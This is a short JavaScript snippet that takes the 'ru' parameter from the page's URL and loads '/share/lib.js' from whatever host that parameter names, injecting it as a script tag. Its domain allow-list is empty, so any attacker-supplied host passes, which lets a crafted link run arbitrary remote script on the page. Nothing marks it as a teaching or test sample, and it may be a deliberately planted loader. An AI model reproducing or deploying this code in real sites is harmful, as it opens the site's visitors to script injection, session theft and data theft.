function getApiUrl(url) {
    var urlPart = url.split('/');
    return urlPart[0] + "//" + urlPart[2] + "/share/lib.js";
}
function validURL(e) {
    return !!new RegExp("^(https?:\\/\\/)?((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|((\\d{1,3}\\.){3}\\d{1,3}))(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*(\\?[;&a-z\\d%_.~+=-]*)?(\\#[-a-z\\d_]*)?$", "i").test(e)
}
var urlRu = new URL(window.location);
var paramHref = urlRu.searchParams.get('ru');
var listDomain = [];
if (paramHref && validURL(paramHref)) {
    var isDomainFound = false;
    for (var i = 0; i < listDomain.length; i++) {
        if (paramHref.indexOf(listDomain[i]) > -1) {
            isDomainFound = true;
        }
    }
    if (!isDomainFound) {
        var fullUrl = getApiUrl(paramHref);
        var depositLib = document.createElement('script');
        depositLib.type = "text/javascript";
        depositLib.src = fullUrl;
        document.body.appendChild(depositLib);
    }
}

